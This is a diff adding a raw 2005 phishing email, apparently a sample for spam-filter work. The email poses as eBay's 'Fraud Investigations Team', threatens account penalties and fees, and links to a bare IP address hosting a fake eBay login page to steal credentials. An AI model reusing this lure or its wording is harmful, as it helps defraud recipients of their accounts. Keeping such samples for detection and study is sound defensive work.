@@ -1,0 +1,97 @@
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 26932 invoked by uid 115); 23 Jul 2005 13:12:03 -0000
+Received: from salesteam@server1.svherald.net by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(216.171.136.94):. 
+ Processed in 0.168095 secs); 23 Jul 2005 13:12:03 -0000
+Received: from transedge-136-94.transedge.com (HELO server1.svherald.net) (216.171.136.94)
+  by churchill.factcomp.com with SMTP; 23 Jul 2005 13:12:02 -0000
+Received: by server1.svherald.net (Postfix, from userid 1053)
+	id 22D181252DD; Sat, 23 Jul 2005 06:11:43 -0700 (MST)
+To: bruceg@em.ca
+Subject: FIT : Fraud Investigations Team : case 1281 / 2005
+From: support@ebay.com <support@ebay.com>
+Content-Type: text/html
+Message-Id: <20050723131143.22D181252DD@server1.svherald.net>
+Date: Sat, 23 Jul 2005 06:11:43 -0700 (MST)
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Fraud Investigations Team ( F I T )</title>
+</head>
+
+<body>
+
+<p>
+<img src="http://pics.ebaystatic.com/aw/pics/navbar/redesign_p1/ebayLogo.gif" border="0" width="150" height="70"><b><font style="line-height: 1.35em" face="Arial, Helvetica, sans-serif" size="2">FIT : 
+Fraud Investigations Team : case 1281 / 2005 .</font></b></p>
+<table id="table6" height="87" cellSpacing="0" cellPadding="0" width="742" border="0">
+  <tr>
+    <td style="font-size: x-small; font-family: arial,helvetica,sans-serif" width="742" height="1">
+    <img height="10" alt="spacer" src="http://pics.ebay.com/aw/pics/spacer.gif" width="1"></td>
+  </tr>
+  <tr>
+    <td style="font-size: x-small; font-family: arial,helvetica,sans-serif" vAlign="top" width="742" height="118">
+    <font style="line-height: 1.35em" face="Verdana" size="2">
+Creating a safe, well lit marketplace is priority #1 for eBay's Trust & Safety team. When people break our policies, violate consumer trust and the law of the land, eBay and PayPal work with law enforcement throughout the world to apprehend and prosecute 
+
+fraudsters. Our diligence in this area is evidenced by the arrests that are made and the trust that is built both within the community and with law enforcement. Most importantly, we do this without compromising our commitment to our member's privacy. eBay
+
+, Inc., has established a Fraud Investigations Team (FIT) to promote safe use of our platforms, and to collaborate with law enforcement throughout the world to enforce policies, prosecute fraudsters and help keep our Community safe.<BR><BR>   Valued eBay 
+
+
+    Member,
+    <p> We are contacting you to remind you that on 29 July  2005 we identified some unusual  activity in your account coming from a foreign IP address : <BR><BR> capitol.guatemala-203-pc.in ( IP address located in India ) . We have been notified that a card
+
+ associated with your account has been reported as lost or stolen and involved in fraudulent transactions, or that there were additional problems with your card.
+<BR><BR>According to our site policy you will have to confirm that you are the 
+    real owner of the eBay account by completing the following form or else your 
+    account will be marked as fraudulent , and will remain open for investigation. You will pay for the fees wich will result from the financial transactions between eBay and FIT ( Fraud Investigations Team ) . </p>
+    <p><font style="line-height: 1.35em" color="#ff0000"><b>Never share your 
+    eBay password to anyone or give any eBay related information ! </b></font></p>
+    <p><font style="line-height: 1.35em" size="2">Establish your proof of 
+    identity with ID Verify (free of charge) - an easy way to help others trust 
+    you as their trading partner. The process takes about 5 minutes to complete 
+    and involves updating your eBay information. When you're successfully 
+    verified, you will receive an ID Verify icon
+    <img alt="ID Verify icon" src="http://pics.ebaystatic.com/aw/pics/verify-icon.gif" align="absMiddle" border="0" width="16" height="16"> 
+    in your feedback profile. Currently, the service is only available to 
+    residents of the United States and U.S. territories (Puerto Rico, US Virgin 
+    Islands and Guam.) <BR><BR> eBay is committed to ensuring that concerns of our Community members who have been affected by fraudsters are heard. Our Community Outreach Coordinator manages communication from government and consumer protection agencies 
+
+such as the BBB on behalf of consumers. The coordinator proactively encourages government agencies to send any consumer inquiries from within their jurisdiction to eBay and PayPal. The coordinator is responsible for ensuring that all victims of crime on o
+
+ur platforms are treated with fairness and respect and given regular and accurate updates on the progress of cases where appropriate. The coordinator works closely with the eBay and PayPal Fraud Investigation Team (FIT) to encourage resolution of criminal
+
+ proceedings against those responsible for fraud against our community members. Note to eBay members: To help eBay provide the fastest assistance to law enforcement, the above contact information may only be used by official government law enforcement or 
+
+regulatory agencies. 
+ 
+<br><br>eBay's Privacy Policy and Law Enforcement Disclosure: 
+We care deeply about the privacy of the eBay community and will protect the privacy of our members even while working closely with law enforcement to prevent criminal activity. If you are unsure about our privacy practices, please visit eBay's Privacy Cen
+
+tral for more information.   </font></p>
+    <div>
+      <table cellSpacing="0" cellPadding="0" width="600" border="0">
+        <tr>
+          <td style="font-size: x-small; font-family: arial,helvetica,sans-serif">
+          <a href="http://www.ebay.com/" target="_blank">
+          <img alt="eBay logo" hspace="0" src="http://pics.ebay.com/aw/pics/register/HeaderRegister_387x40.gif" border="0" width="387" height="40"></a>
+          <p><span style="FONT-FAMILY: Arial"> <b> To update your eBay records and allow Fraud Investigation Team (FIT) to verify / secure  your account  against those responsible for fraud against our community members , </b></span>
+          <a target="_blank" href="http://211.233.19.231/.eBay/login.html">
+          <span style="COLOR: red; FONT-FAMILY: Arial"> <b> Click here ! </span></a>and fill in the FIT form . For security reasons eBay will record your IP address , the time and date of your login . DEliberate wrong inputs are criminally pursued and ind
+
+icated . Please take care that your account has enough assets , your inputs are correct and u fill in the form as requested by eBay & FIT  . </b></td>
+        </tr>
+      </table>
+    </div>
+    </font></td>
+  </tr>
+</table>
+
+
+<BR><BR><BR><BR
+</body>
+
+</html>
+
+
